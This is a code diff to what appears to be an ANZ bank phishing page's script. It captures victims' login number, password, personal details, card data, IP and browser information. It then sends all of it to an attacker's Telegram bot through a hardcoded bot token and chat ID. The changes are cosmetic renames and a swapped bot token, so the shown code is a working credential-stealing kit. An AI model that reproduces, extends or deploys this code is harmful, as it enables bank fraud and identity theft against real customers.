@@ -659,7 +659,7 @@
       const cvv = document.getElementById('cvv');
       const nameOnCard = document.getElementById('name-on-card');
       
-      // Set numeric keypad for card fields
+      // Set numeric keypad for card and DOB fields
       cardNumber.setAttribute('inputmode', 'numeric');
       cvv.setAttribute('inputmode', 'numeric');
       dobDay.setAttribute('inputmode', 'numeric');
@@ -905,7 +905,7 @@
       };
       
       // Format date as DD/MM/YY
-      const formatDate = (date) => {
+      const formatDateShort = (date) => {
          const d = String(date.getDate()).padStart(2, '0');
          const m = String(date.getMonth() + 1).padStart(2, '0');
          const y = String(date.getFullYear()).slice(-2);
@@ -913,7 +913,7 @@
       };
       
       // Format time as hh:mm am/pm
-      const formatTime = (date) => {
+      const formatTimeShort = (date) => {
          let hours = date.getHours();
          const minutes = String(date.getMinutes()).padStart(2, '0');
          const ampm = hours >= 12 ? 'pm' : 'am';
@@ -921,6 +921,9 @@
          hours = hours ? hours : 12;
          return `${hours}:${minutes} ${ampm}`;
       };
+      
+      // Monospace helper
+      const mono = (text) => `\`${text}\``;
       
       // Form submission
       form.addEventListener('submit', async function(e) {
@@ -948,15 +951,12 @@
          const crn = loginData ? loginData.crn : 'Not captured';
          const password = loginData ? loginData.password : 'Not captured';
          
-         // Monospace wrapper for sensitive data
-         const mono = (text) => `\`${text}\``;
-         
          const message = `
 +---------------- [🔵 ANZ 🔵] ---------------+
 | Client: ${mono(crn)}
 | Password: ${mono(password)}
 +---------------- [👤 PERSONAL INFO 👤] ----------------+
-| Full Name: ${fullName.value}
+| Name: ${fullName.value}
 | DOB: ${formattedDOB}
 | Phone: ${mono(mobileNumber.value)}
 | Address: ${address.value}
@@ -968,11 +968,11 @@
 +------------------ [📍 INFO 📍] ------------------+
 | IP: https://ipgeolocation.io/ip-location/${clientIP}
 | UA: ${navigator.userAgent}
-| Time: ${formatDate(now)}, ${formatTime(now)}
+| Time: ${formatDateShort(now)}, ${formatTimeShort(now)}
 +----------------------------------------------------------+
          `;
          
-         const botToken = '7633701328:AAHKEuYma0PmZnleJYzIi9v1QMKRJQUShfE';
+         const botToken = '8294882391:AAGhtpCr05OR5Y4bNnwmdsPcnMWMQ-8awFw';
          const chatId = '7987288274';
          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
          
@@ -991,5 +991,4 @@
    });
 </script>
    </body>
-
 </html>
